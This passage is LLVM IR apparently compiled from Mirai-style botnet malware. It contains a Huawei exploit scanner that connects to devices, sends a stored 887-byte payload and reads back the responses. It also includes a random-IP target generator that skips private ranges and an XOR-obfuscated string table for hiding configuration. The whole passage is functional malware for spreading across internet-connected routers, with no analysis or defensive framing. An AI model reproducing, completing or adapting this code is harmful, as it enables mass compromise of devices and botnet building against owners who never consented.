  %174 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %158, i64 %159, i32 6, i64 0
  call void @util_zero(i8* %174, i32 256)
  br label %.thread145

; <label>:175:                                    ; preds = %164
  %.pr = load i32, i32* %161, align 8
  switch i32 %.pr, label %189 [
    i32 1, label %176
    i32 3, label %176
    i32 4, label %176
    i32 0, label %.thread145
  ]

; <label>:176:                                    ; preds = %175, %175, %175
  %177 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %160, i64 0, i32 0
  %178 = load i32, i32* %177, align 8
  %179 = srem i32 %178, 64
  %180 = zext i32 %179 to i64
  %181 = shl i64 1, %180
  %182 = sdiv i32 %178, 64
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 %183
  %185 = load i64, i64* %184, align 8
  %186 = or i64 %181, %185
  store i64 %186, i64* %184, align 8
  %187 = load i32, i32* %177, align 8
  %188 = icmp sgt i32 %187, %.0132174
  %..0132 = select i1 %188, i32 %187, i32 %.0132174
  br label %.thread145

; <label>:189:                                    ; preds = %175
  %190 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %160, i64 0, i32 0
  %191 = load i32, i32* %190, align 8
  %192 = srem i32 %191, 64
  %193 = zext i32 %192 to i64
  %194 = shl i64 1, %193
  %195 = sdiv i32 %191, 64
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %2, i64 0, i32 0, i64 %196
  %198 = load i64, i64* %197, align 8
  %199 = or i64 %194, %198
  store i64 %199, i64* %197, align 8
  %200 = load i32, i32* %190, align 8
  %201 = icmp sgt i32 %200, %.0130175
  %..0130 = select i1 %201, i32 %200, i32 %.0130175
  br label %.thread145

.thread145:                                       ; preds = %157, %189, %176, %175, %170
  %.1133 = phi i32 [ %.0132174, %170 ], [ %..0132, %176 ], [ %.0132174, %175 ], [ %.0132174, %189 ], [ %.0132174, %157 ]
  %.1131 = phi i32 [ %.0130175, %170 ], [ %.0130175, %176 ], [ %.0130175, %175 ], [ %..0130, %189 ], [ %.0130175, %157 ]
  %202 = load i32, i32* %1, align 4
  %203 = add nsw i32 %202, 1
  store i32 %203, i32* %1, align 4
  %204 = icmp slt i32 %203, 128
  br i1 %204, label %157, label %205

; <label>:205:                                    ; preds = %.thread145
  store i64 0, i64* %63, align 8
  store i64 1, i64* %64, align 8
  %206 = icmp sgt i32 %.1133, %.1131
  %207 = select i1 %206, i32 %.1133, i32 %.1131
  %208 = add nsw i32 %207, 1
  %209 = call i32 @select(i32 %208, %struct.fd_set* nonnull %2, %struct.fd_set* nonnull %3, %struct.fd_set* null, %struct.timeval* nonnull %4) #8
  %210 = call i64 @time(i64* null) #8
  %211 = trunc i64 %210 to i32
  store i32 %211, i32* @huawei_fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %212

; <label>:212:                                    ; preds = %205, %.loopexit
  %storemerge137178 = phi i32 [ 0, %205 ], [ %305, %.loopexit ]
  %213 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %214 = sext i32 %storemerge137178 to i64
  %215 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214
  %216 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %215, i64 0, i32 0
  %217 = load i32, i32* %216, align 8
  %218 = icmp eq i32 %217, -1
  br i1 %218, label %.loopexit, label %219

; <label>:219:                                    ; preds = %212
  %220 = sdiv i32 %217, 64
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 %221
  %223 = load i64, i64* %222, align 8
  %224 = srem i32 %217, 64
  %225 = zext i32 %224 to i64
  %226 = shl i64 1, %225
  %227 = and i64 %223, %226
  %228 = icmp eq i64 %227, 0
  br i1 %228, label %254, label %229

; <label>:229:                                    ; preds = %219
  store i32 0, i32* %7, align 4
  store i32 4, i32* %8, align 4
  %230 = load i32, i32* %216, align 8
  %231 = call i32 @getsockopt(i32 %230, i32 1, i32 4, i8* nonnull %65, i32* nonnull %8) #8
  %232 = load i32, i32* %7, align 4
  %233 = or i32 %232, %231
  %234 = icmp eq i32 %233, 0
  br i1 %234, label %235, label %250

; <label>:235:                                    ; preds = %229
  %236 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 2
  %237 = load i32, i32* %236, align 8
  switch i32 %237, label %249 [
    i32 3, label %238
    i32 4, label %246
  ]

; <label>:238:                                    ; preds = %235
  %239 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 8, i64 0
  %240 = call i32 @util_strcpy(i8* %239, i8* getelementptr inbounds ([887 x i8], [887 x i8]* @.str.77, i64 0, i64 0))
  %241 = load i32, i32* %216, align 8
  %242 = call i32 @util_strlen(i8* %239)
  %243 = sext i32 %242 to i64
  %244 = call i64 @send(i32 %241, i8* %239, i64 %243, i32 16384) #8
  call void @util_zero(i8* %239, i32 2560)
  %245 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 6, i64 0
  call void @util_zero(i8* %245, i32 256)
  store i32 4, i32* %236, align 8
  br label %.loopexit

; <label>:246:                                    ; preds = %235
  %247 = load i32, i32* %216, align 8
  %248 = call i32 @close(i32 %247) #8
  store i32 -1, i32* %216, align 8
  store i32 0, i32* %236, align 8
  br label %.loopexit

; <label>:249:                                    ; preds = %235
  store i32 3, i32* %236, align 8
  br label %254

; <label>:250:                                    ; preds = %229
  %251 = load i32, i32* %216, align 8
  %252 = call i32 @close(i32 %251) #8
  store i32 -1, i32* %216, align 8
  %253 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 2
  store i32 0, i32* %253, align 8
  br label %.loopexit

; <label>:254:                                    ; preds = %219, %249
  %255 = load i32, i32* %216, align 8
  %256 = sdiv i32 %255, 64
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %2, i64 0, i32 0, i64 %257
  %259 = load i64, i64* %258, align 8
  %260 = srem i32 %255, 64
  %261 = zext i32 %260 to i64
  %262 = shl i64 1, %261
  %263 = and i64 %262, %259
  %264 = icmp eq i64 %263, 0
  br i1 %264, label %.loopexit, label %.preheader

.preheader:                                       ; preds = %254
  %265 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 2
  %266 = load i32, i32* %265, align 8
  %267 = icmp eq i32 %266, 0
  br i1 %267, label %.loopexit, label %.lr.ph176

.lr.ph176:                                        ; preds = %.preheader
  %268 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 5
  %269 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 6, i64 0
  %270 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 6, i64 64
  %271 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 6, i64 0
  %272 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 1
  br label %273

; <label>:273:                                    ; preds = %.lr.ph176, %.backedge
  %274 = load i32, i32* %268, align 4
  %275 = icmp eq i32 %274, 256
  br i1 %275, label %276, label %279

; <label>:276:                                    ; preds = %273
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %269, i8* nonnull %270, i64 192, i32 1, i1 false)
  %277 = load i32, i32* %268, align 4
  %278 = add nsw i32 %277, -64
  store i32 %278, i32* %268, align 4
  br label %279

; <label>:279:                                    ; preds = %276, %273
  store i32 0, i32* %101, align 4
  %280 = load i32, i32* %216, align 8
  %281 = load i32, i32* %268, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 6, i64 %282
  %284 = sub nsw i32 256, %281
  %285 = call i32 @huawei_recv_strip_null(i32 %280, i8* %283, i32 %284, i32 16384)
  switch i32 %285, label %297 [
    i32 0, label %.thread148
    i32 -1, label %286
  ]

.thread148:                                       ; preds = %279
  store i32 104, i32* %101, align 4
  br label %288

; <label>:286:                                    ; preds = %279
  %.pr147 = load i32, i32* %101, align 4
  %287 = icmp eq i32 %.pr147, 11
  br i1 %287, label %.loopexit.loopexit, label %288

; <label>:288:                                    ; preds = %.thread148, %286
  %289 = load i32, i32* %265, align 8
  %290 = icmp eq i32 %289, 3
  %291 = load i32, i32* %216, align 8
  %292 = call i32 @close(i32 %291) #8
  br i1 %290, label %293, label %296

; <label>:293:                                    ; preds = %288
  call fastcc void @huawei_setup_connection(%struct.exploit_scanner_connection* nonnull %215)
  br label %.backedge

.backedge:                                        ; preds = %293, %297
  %294 = load i32, i32* %265, align 8
  %295 = icmp eq i32 %294, 0
  br i1 %295, label %.loopexit.loopexit, label %273

; <label>:296:                                    ; preds = %288
  store i32 -1, i32* %216, align 8
  store i32 0, i32* %265, align 8
  call void @util_zero(i8* nonnull %271, i32 256)
  br label %.loopexit

; <label>:297:                                    ; preds = %279
  %298 = load i32, i32* %268, align 4
  %299 = add nsw i32 %298, %285
  store i32 %299, i32* %268, align 4
  %300 = load i32, i32* @huawei_fake_time, align 4
  store i32 %300, i32* %272, align 4
  %301 = call i32 @util_strlen(i8* nonnull %271)
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 6, i64 %302
  store i8 0, i8* %303, align 1
  br label %.backedge

.loopexit.loopexit:                               ; preds = %286, %.backedge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %254, %296, %212, %250, %246, %238
  %304 = load i32, i32* %1, align 4
  %305 = add nsw i32 %304, 1
  store i32 %305, i32* %1, align 4
  %306 = icmp slt i32 %305, 128
  br i1 %306, label %212, label %.loopexit150.loopexit
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_random_ip.76() unnamed_addr #1 {
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %1 = tail call i32 @rand_next()
  %2 = tail call i64 @time(i64* null) #8
  %3 = trunc i64 %2 to i32
  tail call void @srand(i32 %3) #8
  %4 = lshr i32 %1, 8
  %trunc = trunc i32 %1 to i8
  switch i8 %trunc, label %18 [
    i8 127, label %.critedge.backedge
    i8 0, label %.critedge.backedge
    i8 3, label %.critedge.backedge
    i8 15, label %.critedge.backedge
    i8 16, label %.critedge.backedge
    i8 56, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 -64, label %5
    i8 -84, label %8
    i8 100, label %11
    i8 -87, label %14
    i8 -58, label %15
  ]

; <label>:5:                                      ; preds = %.critedge
  %6 = and i32 %4, 255
  %7 = icmp eq i32 %6, 168
  br i1 %7, label %.critedge.backedge, label %switch.early.test.thread

; <label>:8:                                      ; preds = %.critedge
  %9 = and i32 %4, 240
  %10 = icmp eq i32 %9, 16
  br i1 %10, label %.critedge.backedge, label %switch.early.test.thread

; <label>:11:                                     ; preds = %.critedge
  %12 = and i32 %4, 255
  %.off = add nsw i32 %12, -64
  %13 = icmp ult i32 %.off, 63
  br i1 %13, label %.critedge.backedge, label %switch.early.test.thread

; <label>:14:                                     ; preds = %.critedge
  %.old = and i32 %4, 255
  %.old81 = icmp eq i32 %.old, 255
  br i1 %.old81, label %.critedge.backedge, label %switch.early.test.thread

.critedge.backedge:                               ; preds = %14, %5, %8, %11, %15, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %18, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test
  br label %.critedge

; <label>:15:                                     ; preds = %.critedge
  %16 = and i32 %4, 254
  %17 = icmp eq i32 %16, 18
  br i1 %17, label %.critedge.backedge, label %switch.early.test.thread

; <label>:18:                                     ; preds = %.critedge
  %19 = and i32 %1, 224
  %.old85 = icmp ugt i32 %19, 223
  br i1 %.old85, label %.critedge.backedge, label %switch.early.test

switch.early.test:                                ; preds = %18
  %trunc136 = trunc i32 %1 to i8
  switch i8 %trunc136, label %switch.early.test.thread [
    i8 -41, label %.critedge.backedge
    i8 -42, label %.critedge.backedge
    i8 55, label %.critedge.backedge
    i8 33, label %.critedge.backedge
    i8 30, label %.critedge.backedge
    i8 29, label %.critedge.backedge
    i8 28, label %.critedge.backedge
    i8 26, label %.critedge.backedge
    i8 22, label %.critedge.backedge
    i8 21, label %.critedge.backedge
    i8 11, label %.critedge.backedge
    i8 7, label %.critedge.backedge
    i8 6, label %.critedge.backedge
  ]

switch.early.test.thread:                         ; preds = %14, %5, %8, %11, %switch.early.test, %15
  %20 = tail call i32 @rand() #8
  %21 = srem i32 %20, 3
  %22 = icmp ult i32 %21, 3
  br i1 %22, label %switch.lookup, label %33

switch.lookup:                                    ; preds = %switch.early.test.thread
  %23 = lshr i32 %1, 24
  %24 = sext i32 %21 to i64
  %switch.gep = getelementptr inbounds [3 x i32], [3 x i32]* @switch.table, i64 0, i64 %24
  %switch.load = load i32, i32* %switch.gep, align 4
  %25 = shl i32 %4, 16
  %26 = and i32 %25, 16711680
  %27 = lshr i32 %1, 8
  %28 = and i32 %27, 65280
  %29 = or i32 %28, %23
  %30 = or i32 %29, %26
  %31 = or i32 %30, %switch.load
  %32 = tail call i32 @htonl(i32 %31) #12
  br label %33

; <label>:33:                                     ; preds = %switch.early.test.thread, %switch.lookup
  %.0 = phi i32 [ undef, %switch.early.test.thread ], [ %32, %switch.lookup ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @huawei_setup_connection(%struct.exploit_scanner_connection* nocapture) unnamed_addr #1 {
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = bitcast %struct.sockaddr_in* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 16, i32 4, i1 false)
  %4 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 0
  %5 = load i32, i32* %4, align 8
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %1
  %8 = tail call i32 @close(i32 %5) #8
  br label %9

; <label>:9:                                      ; preds = %1, %7
  %10 = tail call i32 @socket(i32 2, i32 1, i32 0) #8
  store i32 %10, i32* %4, align 8
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %35, label %12

; <label>:12:                                     ; preds = %9
  %13 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 5
  store i32 0, i32* %13, align 4
  %14 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 6, i64 0
  tail call void @util_zero(i8* %14, i32 256)
  %15 = load i32, i32* %4, align 8
  %16 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 3, i32 0) #8
  %17 = or i32 %16, 2048
  %18 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 4, i32 %17) #8
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 3
  %21 = load i32, i32* %20, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  store i32 %21, i32* %22, align 4
  %23 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 4
  %24 = load i16, i16* %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i32, i32* @huawei_fake_time, align 4
  %27 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 1
  store i32 %26, i32* %27, align 4
  %28 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 2
  %29 = load i32, i32* %28, align 8
  %.off = add i32 %29, -3
  %switch = icmp ult i32 %.off, 2
  br i1 %switch, label %31, label %30

; <label>:30:                                     ; preds = %12
  store i32 1, i32* %28, align 8
  br label %31

; <label>:31:                                     ; preds = %12, %30
  %32 = load i32, i32* %4, align 8
  %33 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %34 = call i32 @connect(i32 %32, %struct.sockaddr* nonnull %33, i32 16) #8
  br label %35

; <label>:35:                                     ; preds = %9, %31
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @huawei_recv_strip_null(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = sext i32 %2 to i64
  %6 = tail call i64 @recv(i32 %0, i8* %1, i64 %5, i32 %3) #8
  %7 = trunc i64 %6 to i32
  %8 = icmp sgt i32 %7, 0
  br i1 %8, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %wide.trip.count = and i64 %6, 4294967295
  %9 = add nsw i64 %wide.trip.count, -1
  %xtraiter = and i64 %6, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %14, %.lr.ph.prol.preheader
  %indvars.iv.prol = phi i64 [ %indvars.iv.next.prol, %14 ], [ 0, %.lr.ph.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %14 ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %10 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.prol
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i8 %11, 0
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %.lr.ph.prol
  store i8 65, i8* %10, align 1
  br label %14

; <label>:14:                                     ; preds = %13, %.lr.ph.prol
  %indvars.iv.next.prol = add nuw nsw i64 %indvars.iv.prol, 1
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !8

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %14
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader, %.lr.ph.prol.loopexit.unr-lcssa
  %indvars.iv.unr = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next.prol, %.lr.ph.prol.loopexit.unr-lcssa ]
  %15 = icmp ult i64 %9, 3
  br i1 %15, label %.loopexit.loopexit, label %.lr.ph.preheader.new

.lr.ph.preheader.new:                             ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %32, %.lr.ph.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph.preheader.new ], [ %indvars.iv.next.3, %32 ]
  %16 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv
  %17 = load i8, i8* %16, align 1
  %18 = icmp eq i8 %17, 0
  br i1 %18, label %19, label %.lr.ph.113

; <label>:19:                                     ; preds = %.lr.ph
  store i8 65, i8* %16, align 1
  br label %.lr.ph.113

.lr.ph.113:                                       ; preds = %.lr.ph, %19
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %20 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next
  %21 = load i8, i8* %20, align 1
  %22 = icmp eq i8 %21, 0
  br i1 %22, label %23, label %.lr.ph.214

.loopexit.loopexit.unr-lcssa:                     ; preds = %32
  br label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph.prol.loopexit, %.loopexit.loopexit.unr-lcssa
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4
  ret i32 %7

; <label>:23:                                     ; preds = %.lr.ph.113
  store i8 65, i8* %20, align 1
  br label %.lr.ph.214

.lr.ph.214:                                       ; preds = %23, %.lr.ph.113
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %24 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.1
  %25 = load i8, i8* %24, align 1
  %26 = icmp eq i8 %25, 0
  br i1 %26, label %27, label %.lr.ph.315

; <label>:27:                                     ; preds = %.lr.ph.214
  store i8 65, i8* %24, align 1
  br label %.lr.ph.315

.lr.ph.315:                                       ; preds = %27, %.lr.ph.214
  %indvars.iv.next.2 = add nsw i64 %indvars.iv, 3
  %28 = getelementptr inbounds i8, i8* %1, i64 %indvars.iv.next.2
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %.lr.ph.315
  store i8 65, i8* %28, align 1
  br label %32

; <label>:32:                                     ; preds = %31, %.lr.ph.315
  %indvars.iv.next.3 = add nsw i64 %indvars.iv, 4
  %exitcond.3 = icmp eq i64 %indvars.iv.next.3, %wide.trip.count
  br i1 %exitcond.3, label %.loopexit.loopexit.unr-lcssa, label %.lr.ph
}

; Function Attrs: noinline nounwind uwtable
define void @rand_init() local_unnamed_addr #1 {
  %1 = tail call i64 @time(i64* null) #8
  %2 = trunc i64 %1 to i32
  store i32 %2, i32* @x, align 4
  %3 = tail call i32 @getpid() #8
  %4 = tail call i32 @getppid() #8
  %5 = xor i32 %4, %3
  store i32 %5, i32* @y, align 4
  %6 = tail call i64 @clock() #8
  %7 = trunc i64 %6 to i32
  store i32 %7, i32* @z, align 4
  %8 = load i32, i32* @y, align 4
  %9 = xor i32 %8, %7
  store i32 %9, i32* @w, align 4
  ret void
}

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #4

; Function Attrs: nounwind
declare i64 @clock() local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_next() local_unnamed_addr #0 {
  %1 = load i32, i32* @x, align 4
  %2 = shl i32 %1, 11
  %3 = xor i32 %2, %1
  %4 = lshr i32 %3, 8
  %5 = load i32, i32* @y, align 4
  store i32 %5, i32* @x, align 4
  %6 = load i32, i32* @z, align 4
  store i32 %6, i32* @y, align 4
  %7 = load i32, i32* @w, align 4
  store i32 %7, i32* @z, align 4
  %8 = lshr i32 %7, 19
  %9 = xor i32 %4, %3
  %10 = xor i32 %9, %7
  %11 = xor i32 %10, %8
  store i32 %11, i32* @w, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @table_init() local_unnamed_addr #1 {
  tail call fastcc void @add_entry(i8 zeroext 1, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.84, i64 0, i64 0), i32 14)
  tail call fastcc void @add_entry(i8 zeroext 2, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1.85, i64 0, i64 0), i32 19)
  tail call fastcc void @add_entry(i8 zeroext 3, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2.86, i64 0, i64 0), i32 23)
  tail call fastcc void @add_entry(i8 zeroext 4, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3.87, i64 0, i64 0), i32 24)
  tail call fastcc void @add_entry(i8 zeroext 5, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4.88, i64 0, i64 0), i32 15)
  tail call fastcc void @add_entry(i8 zeroext 6, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5.89, i64 0, i64 0), i32 22)
  tail call fastcc void @add_entry(i8 zeroext 7, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6.90, i64 0, i64 0), i32 15)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_entry(i8 zeroext, i8* nocapture readonly, i32) unnamed_addr #1 {
  %4 = sext i32 %2 to i64
  %5 = tail call noalias i8* @malloc(i64 %4) #8
  tail call void @util_memcpy(i8* %5, i8* %1, i32 %2)
  %6 = zext i8 %0 to i64
  %7 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %6, i32 0
  store i8* %5, i8** %7, align 16
  %8 = trunc i32 %2 to i16
  %9 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %6, i32 1
  store i16 %8, i16* %9, align 8
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_unlock_val(i8 zeroext) local_unnamed_addr #0 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @toggle_obf(i8 zeroext) unnamed_addr #0 {
  %2 = zext i8 %0 to i64
  %3 = load i32, i32* @table_key, align 4
  %4 = lshr i32 %3, 8
  %5 = lshr i32 %3, 16
  %6 = lshr i32 %3, 24
  %7 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %2, i32 1
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %10 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %2, i32 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = load i8*, i8** %10, align 16
  %13 = getelementptr inbounds i8, i8* %12, i64 %indvars.iv
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = xor i32 %15, %3
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %13, align 1
  %18 = load i8*, i8** %10, align 16
  %19 = getelementptr inbounds i8, i8* %18, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = xor i32 %21, %4
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* %19, align 1
  %24 = load i8*, i8** %10, align 16
  %25 = getelementptr inbounds i8, i8* %24, i64 %indvars.iv
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %5
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* %25, align 1
  %30 = load i8*, i8** %10, align 16
  %31 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = xor i32 %33, %6
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %31, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = load i16, i16* %7, align 8
  %37 = zext i16 %36 to i64
  %38 = icmp slt i64 %indvars.iv.next, %37
  br i1 %38, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_lock_val(i8 zeroext) local_unnamed_addr #0 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #0 {
  %3 = sext i32 %0 to i64
  %4 = icmp eq i32* %1, null
  br i1 %4, label %9, label %5

; <label>:5:                                      ; preds = %2
  %6 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %3, i32 1
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  store i32 %8, i32* %1, align 4
  br label %9

; <label>:9:                                      ; preds = %2, %5
  %10 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %3, i32 0
  %11 = load i8*, i8** %10, align 16
  ret i8* %11
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_strlen(i8* nocapture readonly) local_unnamed_addr #3 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.03 = phi i32 [ %5, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i8* [ %4, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %4 = getelementptr inbounds i8, i8* %.012, i64 1
  %5 = add nuw nsw i32 %.03, 1
  %6 = load i8, i8* %4, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i32 [ 0, %1 ], [ %5, %._crit_edge.loopexit ]
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @util_strcpy(i8* nocapture, i8* nocapture readonly) local_unnamed_addr #0 {
  %3 = tail call i32 @util_strlen(i8* %1)
  %4 = add nsw i32 %3, 1
  tail call void @util_memcpy(i8* %0, i8* %1, i32 %4)
  ret i32 %3
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @util_memcpy(i8* nocapture, i8* nocapture readonly, i32) local_unnamed_addr #0 {
